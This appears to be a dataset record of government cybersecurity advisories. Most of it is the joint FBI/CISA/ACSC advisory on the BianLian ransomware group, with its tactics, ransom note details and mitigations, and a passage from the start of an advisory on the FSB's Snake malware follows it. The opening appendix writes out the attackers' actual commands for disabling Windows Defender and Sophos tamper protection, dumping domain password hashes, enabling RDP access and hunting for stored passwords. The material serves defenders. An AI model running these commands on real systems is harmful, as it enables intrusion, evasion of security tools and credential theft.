cmd.exe /Q /c net user <admin> /active:yes 1> \\127.0.0.1\C$\Windows\Temp\<folder> 2>&1
Activates the local Administrator account.


cmd.exe /Q /c net user ""<admin>""<password> 1> \\127.0.0.1\C$\Windows\Temp\<folder> 2>&1
Changes the password of the newly activated local Administrator account.


cmd.exe /Q /c quser 1> \\127.0.0.1\C$\Windows\Temp\<folder> 2>&1
Executes quser.exe to query the currently logged-in users on a machine. The command is provided arguments to run quietly and exit upon completion, and the output is directed to the \Windows\Temp directory.


dism.exe /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart
Using the Deployment Image Servicing and Management (DISM) executable file, removes the Windows Defender feature.


dump.exe -no-pass -just-dc user.local/<fileserver.local>\@<local_ip>
Executes secretsdump.py, a Portable Executable version of an Impacket tool. Used to dump password hashes from domain controllers.


exp.exe -n <fileserver.local> -t <local_ip>
Possibly attempted exploitation of the NetLogon vulnerability (CVE-2020-1472).


findstr /spin ""password"" *.* >C:\Users\training\Music\<file>.txt
Searches for the string password in all files in the current directory and its subdirectories and puts the output to a file.


ldap.exe -u user\<user> -p <password> ldap://<local_ip>
Connects to the organization’s Lightweight Directory Access Protocol (LDAP) server.


logoff
Logs off the current user from a Windows session. Can be used to log off multiple users at once.


mstsc
Launches Microsoft Remote Desktop Connection client application in Windows.


net group /domain
Retrieves a list of all groups from the domain controller.


net group 'Domain Admins' /domain
Queries the domain controller to retrieve a list of all accounts from Domain Admins group.


net group 'Domain Computers' /domain
Queries the domain controller to retrieve a list of all accounts from Domain Computers group.


net user /domain
Queries the domain controller to retrieve a list of all users in the domain.


net.exe localgroup ""Remote Desktop Users"" <user> /add
Adds a user account to the local Remote Desktop Users group.


net.exe user <admin> <password> /domain
Modifies the password for the specified account.


netsh.exe advfirewall firewall add rule ""name=allow RemoteDesktop"" dir=in * protocol=TCP localport=<port num> action=allow
Adds a new rule to the Windows firewall that allows incoming RDP traffic.


netsh.exe advfirewall firewall set rule ""group=remote desktop"" new enable=Yes
Enables the pre-existing Windows firewall rule group named Remote Desktop. This rule group allows incoming RDP traffic.


nltest /dclist
Retrieves a list of domain controllers.


nltest /domain_trusts
Retrieves a list of domain trusts.


ping.exe -4 -n 1 *
Sends a single ICMP echo request packet to all devices on the local network using the IPv4 protocol. The output of the command will show if the device is reachable or not.


quser; ([adsisearcher]""(ObjectClass=computer)"").FindAll().count;([adsisearcher]""(ObjectClass=user)"").FindAll().count;[Security.Principal.WindowsIdentity]::GetCurrent() | select name;net user ""$env:USERNAME"" /domain; (Get-WmiObject -class Win32_OperatingSystem).Caption; Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem; net group ""domain admins"" /domain; nltest /dclist:; nltest /DOMAIN_TRUSTS
Lists the current Windows identity for the logged-in user and displays the user's name. Uses the Active Directory Services Interface (ADSI) to search for all computer and user objects in the domain and returns counts of the quantities found. Lists information about the current user account from the domain, such as the user's name, description, and group memberships. Lists information about the operating system installed on the local computer. Lists information about the ""Domain Admins"" group from the domain. Lists all domain controllers in the domain. Displays information about domain trusts.


reg.exe add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal * Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD /d 0 /f
Adds/overwrites a new Registry value to disable user authentication for RDP connections.


reg.exe add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /* v fAllowToGetHelp /t REG_DWORD /d 1 /f
Adds/overwrites a new Registry value to allow a user to receive help from Remote Assistance.


reg.exe add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sophos Endpoint * Defense\TamperProtection\Config"" /t REG_DWORD /v SAVEnabled /d 0 /f
Adds/overwrites a new Registry value to disable tamper protection for Sophos antivirus named SAVEnabled.


reg.exe add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sophos Endpoint * Defense\TamperProtection\Config"" /t REG_DWORD /v SEDEnabled /d 0 /f
Adds/overwrites a new Registry value to disable tamper protection for Sophos antivirus named SEDEnabled.


reg.exe ADD * HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Sophos\SAVService\TamperProtection /t REG_DWORD /v Enabled /d 0 /f
Adds/overwrites a new registry value to disable tamper protection for a Sophos antivirus service called SAVService.


reg.exe copy hklm\system\CurrentControlSet\services\tvnserver * hklm\system\CurrentControlSet\control\safeboot\network\tvnserver /s /f
Copies the configuration settings for the tvnserver service to a new location in the registry that will be used when the computer boots into Safe Mode with Networking. This allows the service to run with the same settings in Safe Mode as it does in normal mode.


s.exe /threads:50 /ldap:all /verbose /outfile:c:\users\<user>\desktop\1.txt
Executes SharpShares.


schtasks.exe /RU SYSTEM /create /sc ONCE /<user> /tr ""cmd.exe /crundll32.exe c:\programdata\netsh.dll,Entry"" /ST 04:43
Creates a Scheduled Task run as SYSTEM at 0443 AM. When the task is run, cmd.exe uses crundll32.exe to run the DLL file netsh.dll. (It is likely that netsh.dll is a malware file and not associated with netsh.)


start-process PowerShell.exe -arg C:\Users\Public\Music\<file>.ps1 -WindowStyle Hidden
Executes a PowerShell script, while keeping the PowerShell window hidden from the user.



Disclaimer
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and ACSC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, or ACSC.
 






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1562.001', 'T1098', 'T1219', 'T1537', 'T1482', 'T1069.002', 'T1003.001', 'T1105', 'T1112', 'T1018', 'T1115', 'T1567.002', 'T1135', 'T1078', 'T1003', 'T1552.001', 'T1566', 'T1046', 'T1133', 'T1012', 'T1059.001', 'T1033', 'T1003.003', 'T1136.001', 'T1021.001', 'T1587.001', 'T1486', 'T1053.005', 'T1059.003', 'T1048', 'T1562.004'}","






Actions to take today to mitigate cyber threats from BianLian ransomware and data extortion: 




Strictly limit the use of RDP and other remote desktop services.
Disable command-line and scripting activities and permissions.
Restrict usage of PowerShell and update Windows PowerShell or PowerShell Core to the latest version.







Summary
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Cyber Security Centre (ACSC) are releasing this joint Cybersecurity Advisory to disseminate known BianLian ransomware and data extortion group IOCs and TTPs identified through FBI and ACSC investigations as of March 2023.
BianLian is a ransomware developer, deployer, and data extortion cybercriminal group that has targeted organizations in multiple U.S. critical infrastructure sectors since June 2022. They have also targeted Australian critical infrastructure sectors in addition to professional services and property development. The group gains access to victim systems through valid Remote Desktop Protocol (RDP) credentials, uses open-source tools and command-line scripting for discovery and credential harvesting, and exfiltrates victim data via File Transfer Protocol (FTP), Rclone, or Mega. BianLian group actors then extort money by threatening to release data if payment is not made. BianLian group originally employed a double-extortion model in which they encrypted victims’ systems after exfiltrating the data; however, around January 2023, they shifted to primarily exfiltration-based extortion.
FBI, CISA, and ACSC encourage critical infrastructure organizations and small- and medium-sized organizations to implement the recommendations in the Mitigations section of this advisory to reduce the likelihood and impact of BianLian and other ransomware incidents.
Download the PDF version of this report (710kb):


AA23-136A #StopRansomware: BianLian Ransomware Group
(PDF,       644.23 KB
  )


For a downloadable copy of IOCs (35kb), see:


AA23-136A STIX XML
(XML,       34.72 KB
  )


For a downloadable copy of IOCs in JSON format, see AA23-136A.stix.json
Technical Details
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See the MITRE ATT&CK® Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® Tactics and Techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
BianLian is a ransomware developer, deployer, and data extortion cybercriminal group. FBI observed BianLian group targeting organizations in multiple U.S. critical infrastructure sectors since June 2022. In Australia, ACSC has observed BianLian group predominately targeting private enterprises, including one critical infrastructure organization. BianLian group originally employed a double-extortion model in which they exfiltrated financial, client, business, technical, and personal files for leverage and encrypted victims’ systems. In 2023, FBI observed BianLian shift to primarily exfiltration-based extortion with victims’ systems left intact, and ACSC observed BianLian shift exclusively to exfiltration-based extortion. BianLian actors warn of financial, business, and legal ramifications if payment is not made.
Initial Access
BianLian group actors gain initial access to networks by leveraging compromised Remote Desktop Protocol (RDP) credentials likely acquired from initial access brokers, or via phishing,.
Command and Control
BianLian group actors implant a custom backdoor specific to each victim written in Go (see the Indicators of Compromise Section for an example), and install remote management and access software—e.g., TeamViewer, Atera Agent, SplashTop, AnyDesk—for persistence and command and control,.
FBI also observed BianLian group actors create and/or activate local administrator accounts, and change those account passwords,.
Defense Evasion
BianLian group actors use PowerShell, and Windows Command Shell, to disable antivirus tools, specifically Windows defender and Anti-Malware Scan Interface (AMSI). BianLian actors modify the Windows Registry, to disable tamper protection for Sophos SAVEnabled, SEDEenabled, and SAVService services, which enables them to uninstall these services. See Appendix: Windows PowerShell and Command Shell Activity for additional information, including specific commands they have used.
Discovery
BianLian group actors use a combination of compiled tools, which they first download to the victim environment, to learn about the victim’s environment. BianLian group actors have used:

Advanced Port Scanner, a network scanner used to find open ports on network computers and retrieve versions of programs running on the detected ports,.
SoftPerfect Network Scanner (netscan.exe), a network scanner that can ping computers, scan ports, and discover shared folders,.
SharpShares to enumerate accessible network shares in a domain.
PingCastle to enumerate Active Directory (AD),. PingCastle provides an AD map to visualize the hierarchy of trust relationships.

BianLian actors also use native Windows tools and Windows Command Shell to:

Query currently logged-in users,.
Query the domain controller to identify:

All groups,.
Accounts in the Domain Admins and Domain Computers groups,1087.002,.
All users in the domain.


Retrieve a list of all domain controllers and domain trusts.
Identify accessible devices on the network,.

See Appendix: Windows PowerShell and Command Shell Activity for additional information, including specific commands they have used.
Credential Access
BianLian group uses valid accounts for lateral movement through the network and to pursue other follow-on activity. To obtain the credentials, BianLian group actors use Windows Command Shell to find unsecured credentials on the local machine,. FBI also observed BianLian harvest credentials from the Local Security Authority Subsystem Service (LSASS) memory, download RDP Recognizer (a tool that could be used to brute force RDP passwords or check for RDP vulnerabilities) to the victim system, and attempt to access an Active Directory domain database (NTDS.dit),.
In one case, FBI observed BianLian actors use a portable executable version of an Impacket tool (secretsdump.py) to move laterally to a domain controller and harvest credential hashes from it. Note: Impacket is a Python toolkit for programmatically constructing and manipulating network protocols. Through the Command Shell, an Impacket user with credentials can run commands on a remote device using the Windows management protocols required to support an enterprise network. Threat actors can run portable executable files on victim systems using local user rights, assuming the executable is not blocked by an application allowlist or antivirus solution.
See Appendix: Windows PowerShell and Command Shell Activity for additional information.
Persistence and Lateral Movement
BianLian group actors use PsExec and RDP with valid accounts for lateral movement,. Prior to using RDP, BianLian actors used Command Shell and native Windows tools to add user accounts to the local Remote Desktop Users group, modified the added account’s password, and modified Windows firewall rules to allow incoming RDP traffic,. See Appendix: Windows PowerShell and Command Shell Activity for additional information.
In one case, FBI found a forensic artifact (exp.exe) on a compromised system that likely exploits the Netlogon vulnerability (CVE-2020-1472) and connects to a domain controller.
Collection
FBI observed BianLian group actors using malware (system.exe) that enumerates registry, and files, and copies clipboard data from users,.
Exfiltration and Impact
BianLian group actors search for sensitive files using PowerShell scripts (See Appendix: Windows PowerShell and Command Shell Activity) and exfiltrate them for data extortion. Prior to January 2023, BianLian actors encrypted files, after exfiltration for double extortion.
BianLian group uses File Transfer Protocol (FTP), and Rclone, a tool used to sync files to cloud storage, to exfiltrate data,. FBI observed BianLian group actors install Rclone and other files in generic and typically unchecked folders such as programdata\vmware and music folders. ACSC observed BianLian group actors use Mega file-sharing service to exfiltrate victim data,.
BianLian’s encryptor (encryptor.exe) modified all encrypted files to have the .bianlian extension. The encryptor created a ransom note, Look at this instruction.txt, in each affected directory (see Figure 1 for an example ransom note.) According to the ransom note, BianLian group specifically looked for, encrypted, and exfiltrated financial, client, business, technical, and personal files.



If a victim refuses to pay the ransom demand, BianLian group threatens to publish exfiltrated data to a leak site maintained on the Tor network. The ransom note provides the Tox ID A4B3B0845DA242A64BF17E0DB4278EDF85855739667D3E2AE8B89D5439015F07E81D12D767FC, which does not vary across victims. The Tox ID directs the victim organization to a Tox chat via https://qtox.github,.,io and includes an alternative contact email address (swikipedia@onionmail,.,org or xxx@mail2tor,.,com). The email address is also the same address listed on the group’s Tor site under the contact information section. Each victim company is assigned a unique identifier included in the ransom note. BianLian group receives payments in unique cryptocurrency wallets for each victim company.
BianLian group engages in additional techniques to pressure the victim into paying the ransom; for example, printing the ransom note to printers on the compromised network. Employees of victim companies also reported receiving threatening telephone calls from individuals associated with BianLian group.
Indicators of Compromise (IOC)
See Table 1 for IOCs obtained from FBI investigations as of March 2023.

MITRE ATT&CK Techniques
See Table 2 for all referenced threat actor tactics and techniques in this advisory.












Mitigations
FBI, CISA, and ACSC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the threat actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable,CPG 2.T,.
Using security software to detect instances of remote access software only being loaded in memory.
Requiring authorized remote access solutions only be used from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.


Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.



See NSA Cybersecurity Information sheet Enforce Signed Software Execution Policies for additional guidance.

Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions,CPG 2.N,.
Restrict the use of PowerShell, using Group Policy, and only grant to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell,CPG 2.E,.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities,CPG 1.E, 2.S, 2.T,.
Enable enhanced PowerShell logging,CPG 2.T, 2.U,.

PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts,CPG 4.C,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege,CPG 2.E,.
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts set at the admin level and higher,CPG 2.A, 2.E,. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory (AD) level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.

In addition, FBI, CISA, and ACSC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data, and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization minimizes the impact of disruption to business practices as they will not be as severe and/or only have irretrievable data,CPG 2.R,. ACSC recommends organizations follow the 3-2-1 backup strategy in which organizations have three copies of data (one copy of production data and two backup copies) on two different media such as disk and tape, with one copy kept off-site for disaster recovery.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints”.
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems,CPG 2.H,.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours from vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks, restricting further lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections, as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

Validate Security Controls
In addition to applying mitigations, FBI, CISA, and ACSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, and ACSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, and ACSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov, a whole-of-government approach with one central location for U.S. ransomware resources and alerts.
cyber.gov.au for the Australian Government’s central location to report cyber incidents, including ransomware, and to see advice and alerts. The site also provides ransomware advisories for businesses and organizations to help mitigate cyber threats.
CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide for guidance on mitigating and responding to a ransomware attack
For no-cost cyber hygiene services for U.S. organizations,  Cyber Hygiene Services and Ransomware Readiness Assessment.

Reporting
The FBI is seeking any information that can be shared, including boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with BianLian actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office or CISA at cisa.gov/report. Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ACSC via 1300 CYBER1 (1300 292 371) or by submitting a report cyber.gov.au.
Acknowledgements
Microsoft and Sophos contributed to this advisory.
APPENDIX: WINDOWS PowerSHell and COMMAND SHELL ACTIVITY
Through FBI investigations as of March 2023, FBI has observed BianLian actors use the commands in Table 3. ACSC has observed BianLian actors use some of the same commands.

Disclaimer
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and ACSC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, or ACSC.
 






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a
28,"



SUMMARY
The Snake implant is considered the most sophisticated cyber espionage tool designed and used by Center 16 of Russia’s Federal Security Service (FSB) for long-term intelligence collection on sensitive targets. To conduct operations using this tool, the FSB created a covert peer-to-peer (P2P) network of numerous Snake-infected computers worldwide. Many systems in this P2P network serve as relay nodes which route disguised operational traffic to and from Snake implants on the FSB’s ultimate targets. Snake’s custom communications protocols employ encryption and fragmentation for confidentiality and are designed to hamper detection and collection efforts.
We have identified Snake infrastructure in over 50 countries across North America, South America, Europe, Africa, Asia, and Australia, to include the United States and Russia itself. Although Snake uses infrastructure across all industries, its targeting is purposeful and tactical in nature. Globally, the FSB has used Snake to collect sensitive intelligence from high-priority targets, such as government networks, research facilities, and journalists. As one example, FSB actors used Snake to access and exfiltrate sensitive international relations documents, as well as other diplomatic communications, from a victim in a North Atlantic Treaty Organization (NATO) country. Within the United States, the FSB has victimized industries including education, small businesses, and media organizations, as well as critical infrastructure sectors including government facilities, financial services, critical manufacturing, and communications.
This Cybersecurity Advisory (CSA) provides background on Snake’s attribution to the FSB and detailed technical descriptions of the implant’s host architecture and network communications. This CSA also addresses a recent Snake variant that has not yet been widely disclosed. The technical information and mitigation recommendations in this CSA are provided to assist network defenders in detecting Snake and associated activity. For more information on FSB and Russian state-sponsored cyber activity, please see the joint advisory Russian State-Sponsored and Criminal Cyber Threats to Critical Infrastructure and CISA’s Russia Cyber Threat Overview and Advisories webpage.
Download the PDF version of this report:


Hunting Russian Intelligence “Snake” Malware
(PDF,       4.11 MB
  )


INTRODUCTION
What is Snake?
We consider Snake to be the most sophisticated cyber espionage tool in the FSB’s arsenal. The sophistication of Snake stems from three principal areas. First, Snake employs means to achieve a rare level of stealth in its host components and network communications. Second, Snake’s internal technical architecture allows for easy incorporation of new or replacement components. This design also facilitates the development and interoperability of Snake instances running on different host operating systems. We have observed interoperable Snake implants for Windows, MacOS, and Linux operating systems. Lastly, Snake demonstrates careful software engineering design and implementation, with the implant containing surprisingly few bugs given its complexity.
Following open source reporting by cybersecurity and threat intelligence companies on Snake tactics, techniques, and procedures (TTPs), the FSB implemented new techniques to evade detection. The modifications to the implant enhanced challenges in identifying and collecting Snake and related artifacts, directly hampering detection from both host- and network-based defensive tools.
The effectiveness of this type of cyber espionage implant depends entirely on its long-term stealth, since the objective of an extended espionage operation involves remaining on the target for months or years to provide consistent access to important intelligence. The uniquely sophisticated aspects of Snake represent significant effort by the FSB over many years to enable this type of covert access.
Background
The FSB began developing Snake as “Uroburos” in late 2003. Development of the initial versions of the implant appeared to be completed around early 2004, with cyber operations first conducted using the implant shortly thereafter. The name Uroburos is appropriate, as the FSB cycled it through nearly constant stages of upgrade and redevelopment, even after public disclosures, instead of abandoning it. The name appears throughout early versions of the code, and the FSB developers also left other unique strings, including “Ur0bUr()sGoTyOu#”, which have publicly come back to haunt them.
Unique features in early versions of Uroburos included a low resolution image of a portion of a historical illustration of an uroboros by the German philosopher and theologian Jakob Böhme. One approach to a tertiary backdoor used this image as the key. The same image had also been embedded in other Snake-related components. The image, blown up to a higher resolution, is shown below.

 


In addition, early FSB developers of the Snake implant left portions of unique code throughout the implant which reveal inside jokes, personal interests, and taunts directed at security researchers. For instance, the “Ur0bUr()sGoTyOu#” string referenced above was replaced with “gLASs D1cK” in 2014 following some of the public cybersecurity reporting.
Attribution
We attribute Snake operations to a known unit within Center 16 of the FSB.  This unit more broadly operates the numerous elements of the Turla  toolset, and has subunits spread throughout Russia in a reflection of historical KGB signals intelligence operations in the Soviet Union. Snake has been a core component of this unit’s operations for almost as long as Center 16 has been part of the FSB.  The extensive influence of Snake across the Turla toolset demonstrates its impact on practically every aspect of the unit’s modern era of cyber operations.
Daily operations using Snake have been carried out from an FSB facility in Ryazan, Russia, with an increase in Snake activity during FSB working hours in Ryazan, approximately 7:00 AM to 8:00 PM, Moscow Standard Time (GMT+3). The main developers were Ryazan-based FSB officers known by monikers included in the code of some versions of Snake. In addition to developing Snake, Ryazan-based FSB officers used it to conduct worldwide operations; these operations were different from others launched from Moscow or other FSB sites based on infrastructure and techniques.
While the development and re-tooling of Snake has historically been done by Ryazan-based FSB officers, Snake operations were also launched from an FSB Center 16-occupied building in Moscow. Our investigations have identified examples of FSB operators using Snake to its full potential, as well as FSB operators who appeared to be unfamiliar with Snake’s more advanced capabilities. These observations serve to illustrate the difficulty in using such an advanced toolset across the various geographically dispersed teams comprising this unit within FSB Center 16.
We have been collectively investigating Snake and Snake-related tools for almost 20 years, as well as other operations by this unit since the 1990s. During that time, the FSB has used Snake in many different operations, and they have demonstrated the value placed in this tool by making numerous adjustments and revisions to keep it viable after repeated public disclosures and other mitigations. Snake’s code and multiple Snake-related tools have been either a starting point or a key influence factor for a diverse range of other highly prolific implants and operational tools in the Turla family. Most notably, this has included Carbon (aka Cobra)—derived from Snake’s code base—and the similarly Snake-adjacent implant Chinch (currently known in open sources as ComRAT).
Victimization
We have identified Snake infrastructure in over 50 countries across North America, South America, Europe, Africa, Asia, and Australia, to include the United States and Russia itself. Although Snake leverages infrastructure across all industries, its targeting is purposeful and tactical in nature. For instance, if an infected system did not respond to Snake communications, the FSB actors would strategically re-infect it within days. Globally, the FSB has used Snake to collect sensitive intelligence from high priority targets, such as government networks, research facilities, and journalists. As one example, FSB actors used Snake to access and exfiltrate sensitive international relations documents, as well as other diplomatic communications, from a victim in a NATO country. Within the United States, the FSB has victimized industries including education, small businesses, and media organizations, as well as critical infrastructure sectors including government facilities, financial services, critical manufacturing, and communications.
Other Tools and TTPs Employed with Snake
The FSB typically deploys Snake to external-facing infrastructure nodes on a network, and from there uses other tools and TTPs on the internal network to conduct additional exploitation operations. Upon gaining and cementing ingress into a target network, the FSB typically enumerates the network and works to obtain administrator credentials and access domain controllers. A wide array of mechanisms has been employed to gather user and administrator credentials in order to expand laterally across the network, to include keyloggers, network sniffers, and open source tools. 
Typically, after FSB operators map out a network and obtain administrator credentials for various domains in the network, regular collection operations begin. In most instances with Snake, further heavyweight implants are not deployed, and they rely on credentials and lightweight remote-access tools internally within a network. FSB operators sometimes deploy a small remote reverse shell along with Snake to enable interactive operations. This triggerable reverse shell, which the FSB has used for around 20 years, can be used as a backup access vector, or to maintain a minimal presence in a network and avoid detection while moving laterally. 
Snake Architecture
Snake’s architectural design reflects professional software engineering practices. Critical pathways within the implant are made of stacks of loosely coupled components that implement well-designed interfaces. In addition to facilitating software development and debugging, this construction allows Snake to use multiple different components for the same purpose, choosing the specific component based on environmental considerations. For example, Snake’s custom network communications protocols function as a stack. All implementations use an encryption layer and a transport layer, such as Snake’s custom HTTP or raw TCP socket protocol. Each layer of the Snake network protocol stack solely implements a specified interface for operability with the two adjacent layers. The encryption layer and underlying transport layer thus function independently, so any custom Snake network protocol can employ an encryption overlay without any change to the encryption layer code. 
This modularity allows Snake operators to choose the most logical network transport for the given environment without affecting Snake’s other functionality. When using a compromised HTTP server as part of the Snake P2P network, the operators can ensure that all traffic to this machine follows the Snake custom HTTP protocol and thereby blends effectively with legitimate traffic. In the context of a compromised machine that legitimately allows secure shell (SSH) connections, Snake can utilize its custom raw TCP socket protocol instead of its custom HTTP protocol. All other layers of the Snake protocol stack, from the immediately adjacent transport encryption layer to the distant command processing layer, can and do remain entirely agnostic to the transport layer as long as it implements its interface correctly. This architecture also allows the Snake developers to easily substitute a new communications protocol when they believe one has been compromised, without necessitating any downstream changes in the code base. Lastly, this design facilitates the development of fully interoperable Snake implants running on different host operating systems.
Snake’s technical sophistication extends from the software architecture into the lower-level software implementation. Original versions of Snake were developed as early as 2003, before many of the modern programming languages and frameworks that facilitate this type of modular development were available. Snake is written entirely in C, which provides significant advantages in low-level control and efficiency, but which does not provide direct support for objects or interfaces at the language level and provides no assistance with memory management. The developers of Snake successfully implemented the implant’s complex design in C with very few bugs, including careful avoidance of the common pitfalls associated with null-terminated strings and the mixing of signed and unsigned integers. Additionally, the developers demonstrate an understanding of computer science principles throughout the implant’s implementation. This includes selecting and correctly coding asymptotically optimal algorithms, designing and utilizing efficient custom encoding methodologies that closely resemble common encoding schemes, and handling the numerous possible errors associated with systems-level programming in a secure manner.
Capitalizing on Mistakes
